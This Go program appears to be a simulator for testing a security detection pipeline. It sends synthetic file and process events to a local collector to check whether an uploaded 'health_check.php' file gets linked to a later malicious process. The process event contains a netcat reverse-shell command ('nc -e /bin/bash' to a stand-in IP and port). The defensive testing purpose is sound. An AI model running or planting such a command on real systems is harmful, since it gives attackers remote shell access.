package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

type FileEvent struct {
	AgentID   string    `json:"agent_id"`
	Hostname  string    `json:"hostname"`
	FilePath  string    `json:"file_path"`
	Content   string    `json:"content,omitempty"`
	Timestamp time.Time `json:"timestamp"`
}

type ProcessEvent struct {
	AgentID   string    `json:"agent_id"`
	Hostname  string    `json:"hostname"`
	ProcessID int32     `json:"process_id"`
	ParentID  int32     `json:"parent_id"`
	Command   string    `json:"command"`
	Username  string    `json:"username"`
	Timestamp time.Time `json:"timestamp"`
}

func main() {
	log.Println("---" + "INICIANDO SIMULADOR DE CAUSALIDADE (Cenário: Causalidade Forçada)" + "---")

	collectorURL := os.Getenv("COLLECTOR_URL")
	if collectorURL == "" {
		collectorURL = "http://localhost:8080"
	}

	benignContent := "<?php echo \"tudo bem\"; ?>"
	log.Println("Usando conteúdo de arquivo benigno.")

	agentID := "docker-agent-001"
hostname := "webserver-prod-05"
pid := int32(9877)
filePath := "/var/www/html/uploads/health_check.php" // Arquivo de aparência inofensiva

	// 1. Evento de Criação de Arquivo (Benigno)
	log.Printf("Enviando evento de criação do arquivo benigno: %s", filePath)
	fileEvent := FileEvent{
		AgentID:   agentID,
		Hostname:  hostname,
		FilePath:  filePath,
		Content:   benignContent,
		Timestamp: time.Now(),
	}
	sendEvent(collectorURL, "/v1/events/file", fileEvent)

	// 2. Atraso para simular o tempo que o agente fica "adormecido"
	log.Printf("Aguardando 5 segundos antes de disparar o processo malicioso...")
	time.Sleep(5 * time.Second)

	// 3. Evento de Execução de Processo Malicioso (associado ao arquivo benigno)
	log.Printf("Enviando evento de processo malicioso (reverse shell) originado de %s", filePath)
	processEvent := ProcessEvent{
		AgentID:   agentID,
		Hostname:  hostname,
		ProcessID: pid,
		ParentID:  1234, // PID genérico do servidor web
		Command:   "nc -e /bin/bash 10.0.0.5 4444", // Comando de reverse shell
		Username:  "www-data",
		Timestamp: time.Now(),
	}
	sendEvent(collectorURL, "/v1/events/process", processEvent)

	log.Println("---" + "SIMULAÇÃO DE CAUSALIDADE CONCLUÍDA" + "---")
}

func sendEvent(collectorURL, path string, data interface{}) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Printf("Erro ao converter evento para JSON: %v", err)
		return
	}

	resp, err := http.Post(fmt.Sprintf("%s%s", collectorURL, path), "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Erro ao enviar evento para %s: %v", path, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusAccepted {
		log.Printf("Resposta inesperada do collector para %s: %s", path, resp.Status)
	} else {
		log.Printf("Evento enviado com sucesso para %s", path)
	}
}